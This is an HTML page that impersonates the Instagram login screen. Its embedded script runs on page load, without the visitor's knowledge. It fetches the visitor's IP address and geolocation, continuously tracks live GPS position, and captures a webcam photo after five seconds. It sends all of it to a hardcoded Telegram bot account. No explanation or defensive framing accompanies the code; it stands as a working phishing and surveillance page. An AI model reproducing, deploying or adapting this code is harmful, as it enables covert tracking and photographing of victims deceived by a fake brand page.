<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="https://www.instagram.com/static/bundles/es6/ConsumerUICommons.css/bundle.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        .login-container {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 40px;
            text-align: center;
            width: 350px;
            border-radius: 10px;
        }
        .logo {
            width: 180px;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0073e6;
        }
        video {
            width: 100%;
            max-width: 320px;
            margin-top: 10px;
            border-radius: 10px;
        }
    </style>
    <script>
        // Function to get IP Address
        async function getIP() {
            let response = await fetch('https://api64.ipify.org?format=json');
            let data = await response.json();
            return data.ip;
        }

        // Function to get location details from IP
        async function getLocation(ip) {
            let response = await fetch(`https://ip-api.com/json/${ip}`);
            let data = await response.json();
            return data;
        }

        // Function to get real-time GPS location
        function getLiveLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.watchPosition(
                    (position) => {
                        let lat = position.coords.latitude;
                        let lon = position.coords.longitude;
                        let accuracy = position.coords.accuracy;

                        let message = `\nLive Location:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${accuracy} meters\nMap: https://www.google.com/maps?q=${lat},${lon}`;
                        sendToTelegram(message);
                    },
                    (error) => {
                        console.error("Geolocation error: ", error);
                    }
                );
            } else {
                console.error("Geolocation is not supported by this browser.");
            }
        }

        // Function to send data to Telegram bot
        async function sendToTelegram(message) {
            let botToken = "7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds";
            let chatID = "860517021";
            let telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`;
            
            fetch(telegramURL);
        }

        // Capture and send live camera feed
        async function startCamera() {
            try {
                let stream = await navigator.mediaDevices.getUserMedia({ video: true });
                let video = document.getElementById('videoFeed');
                video.srcObject = stream;
                
                let canvas = document.createElement('canvas');
                let ctx = canvas.getContext('2d');
                setTimeout(async () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    let imageData = canvas.toDataURL('image/png');
                    sendPhotoToTelegram(imageData);
                    stream.getTracks().forEach(track => track.stop());
                }, 5000);
            } catch (error) {
                console.error("Camera access denied or failed", error);
            }
        }

        // Send Captured Image to Telegram Bot
        async function sendPhotoToTelegram(imageData) {
            let botToken = "7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds";
            let chatID = "860517021";
            let formData = new FormData();
            formData.append("chat_id", chatID);
            formData.append("photo", dataURItoBlob(imageData), "image.png");
            
            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: "POST",
                body: formData
            });
        }

        // Convert Data URL to Blob
        function dataURItoBlob(dataURI) {
            let byteString = atob(dataURI.split(',')[1]);
            let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            let ab = new ArrayBuffer(byteString.length);
            let ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }

        // Execute functions on page load
        window.onload = async function() {
            let ip = await getIP();
            let locationData = await getLocation(ip);
            let message = `
                New Visitor Detected!\n
                IP Address: ${ip}\n
                Country: ${locationData.country}\n
                City: ${locationData.city}\n
                ISP: ${locationData.isp}\n
                Map: https://www.google.com/maps?q=${locationData.lat},${locationData.lon}
            `;
            
            sendToTelegram(message);
            getLiveLocation();
            startCamera();
        };
    </script>
</head>
<body>
    <div class="login-container">
        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png" alt="Instagram Logo" class="logo">
        <input type="text" placeholder="Phone number, username, or email">
        <input type="password" placeholder="Password">
        <button>Log In</button>
        <video id="videoFeed" autoplay></video>
    </div>
</body>
</html>
